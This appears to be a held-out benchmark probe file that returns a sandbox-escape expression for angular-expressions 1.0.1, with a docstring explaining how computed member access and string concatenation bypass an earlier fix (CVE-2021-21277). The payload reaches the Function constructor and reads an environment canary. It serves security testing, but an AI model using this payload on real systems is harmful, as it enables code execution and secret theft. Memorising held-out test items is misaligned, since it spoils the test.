#!/usr/bin/env python3
"""[HELD-OUT] Residual = CVE-2021-21277 (GHSA-j6px-jwvv-vpwq).

The CVE-2020-5219 fix (1.0.1) guarded DOTTED member READs with
Object.prototype.hasOwnProperty, but it left two holes:
  1. COMPUTED member access -- `computedMember(left,right)` still emitted the raw
     `left[right]` with no hasOwnProperty check.
  2. The CallExpression CALLEE fetch -- for `a.b(...)` the callee value was taken
     via `self.member(...)` (raw `left.context[name]`) UNGUARDED.

So the "more complex" .constructor.constructor payload uses COMPUTED member
access with string concatenation to dodge the dotted guard and route the Function
constructor through the unguarded call-callee fetch:

    ''['c'+'onstructor']['c'+'onstructor']('return process.env.PCB_FLAG')()

This escapes the sandbox on angular-expressions 1.0.1 (V1) even though the simple
dotted seed is blocked. The 1.1.2 fix (CVE-2021-21277) rewrote `computedMember`
to `(left.hasOwnProperty(right) ? left[right] : null)` and made the call-callee
short-circuit to null for non-own properties -> BLOCKED on V2. This payload is
verbatim the angular-expressions 1.1.2 "should not leak" security regression test
(test/main.test.js), with `process` swapped for the benign `process.env.PCB_FLAG`
canary read.
"""


def candidate():
    return {
        "probe_id": "residual-cve-2021-21277-computed-concat-constructor",
        # computed member + string-concat dodges the 1.0.1 dotted guard;
        # call-callee fetch is unguarded on 1.0.1 -> Function -> read env canary.
        "expr": "''['c'+'onstructor']['c'+'onstructor']"
                "('return process.env.PCB_FLAG')()",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate()))
